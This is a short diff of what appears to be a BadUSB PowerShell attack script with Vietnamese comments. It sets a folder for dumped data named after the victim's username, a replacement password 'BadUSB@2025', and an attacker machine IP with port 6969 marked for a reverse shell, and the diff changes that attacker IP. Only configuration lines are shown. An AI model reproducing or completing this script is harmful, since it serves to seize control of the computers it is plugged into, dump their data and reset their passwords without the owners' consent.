@@ -15,7 +15,7 @@ $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $NewPassword = "BadUSB@2025"  # Đặt mật khẩu mới tùy ý
 
 #$IP = '192.168.2.5'
-$IP = '192.168.234.1'    # IP máy tấm công
+$IP = '172.20.10.3'    # IP máy tấn công
 $PORT = '6969'            # Port dùng cho rs
 
 
